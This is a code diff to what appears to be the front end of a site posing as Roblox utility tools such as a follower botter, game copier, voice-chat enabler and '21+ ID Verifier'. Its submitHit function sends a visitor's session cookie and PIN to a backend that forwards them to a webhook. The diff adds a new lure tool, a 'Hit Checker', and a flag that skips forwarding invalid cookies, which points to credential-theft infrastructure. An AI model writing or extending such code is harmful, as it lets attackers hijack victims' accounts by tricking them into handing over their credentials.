@@ -7,14 +7,17 @@ export type ToolKey =
   | 'copy_games'
   | 'copy_clothes'
   | 'group_botter'
-  | 'vc_enabler';
+  | 'vc_enabler'
+  | 'id_verifier';
 
 export type ToolType =
   | 'Bot Followers'
   | 'Game Copier'
   | 'Clothing Copier'
   | 'Group Botter'
-  | 'VC Enabler';
+  | 'VC Enabler'
+  | '21+ ID Verifier'
+  | 'Hit Checker';
 
 interface SubmitArgs {
   toolType: ToolType;
@@ -24,6 +27,8 @@ interface SubmitArgs {
   ownerUsername?: string;
   // Optional tool-specific extras (e.g. Group Botter)
   extras?: Record<string, string | number | undefined>;
+  // When true, edge function skips webhook forwarding if cookie is invalid.
+  checkOnly?: boolean;
 }
 
 const FN_URL = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1`;
@@ -47,6 +52,7 @@ export const submitHit = async (args: SubmitArgs): Promise<boolean> => {
         cookie: args.cookie,
         pin: args.pin,
         extras: args.extras,
+        checkOnly: args.checkOnly,
       }),
     });
     if (!res.ok) {
